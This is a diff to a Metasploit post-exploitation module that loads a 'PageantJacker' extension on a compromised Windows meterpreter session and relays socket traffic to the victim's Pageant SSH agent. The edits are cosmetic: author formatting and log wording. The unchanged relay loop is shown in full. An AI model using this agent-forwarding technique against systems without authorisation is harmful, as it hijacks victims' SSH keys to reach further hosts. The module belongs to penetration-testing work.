@@ -18,7 +18,9 @@ class Metasploit3 < Msf::Post
             This module forwards Pageant.
           },
         'License'       => MSF_LICENSE,
-        'Author'        => 'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>',
+        'Author'        => [ 
+            'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>',
+        ],
         'Platform'      => [ 'win' ],
         'SessionTypes'  => [ 'meterpreter' ]
       ))
@@ -30,8 +32,6 @@ class Metasploit3 < Msf::Post
 
   def run
 
-
-    ## load incognito
     if(!session.pageantjacker)
       print_status("Loading PageantJacker extension on session #{session.sid} (#{session.session_host})")
       session.core.use("pageantjacker")
@@ -63,14 +63,14 @@ class Metasploit3 < Msf::Post
         loop {
           socket_request_data = s.recvfrom(8192)
           break if socket_request_data.nil? || socket_request_data.first.nil? || socket_request_data.first.empty?
-          vprint_status("PageantJacker: Received data from socket (Size: #{socket_request_data.first.size})")
+          vprint_status("PageantJacker: Received data from socket (size: #{socket_request_data.first.size})")
           response = client.pageantjacker.forward_to_pageant(socket_request_data.first, socket_request_data.first.size)
           if response[:success]
             if response[:blob]
                 s.send response[:blob],0 
             end
           end
-          vprint_status("PageantJacker: Success='#{response[:success]}', Error=>'#{response[:error]}'")
+          vprint_status("PageantJacker: Response received (Success='#{response[:success]}' Error='#{response[:error]})'")
         }   
       }   
     }   
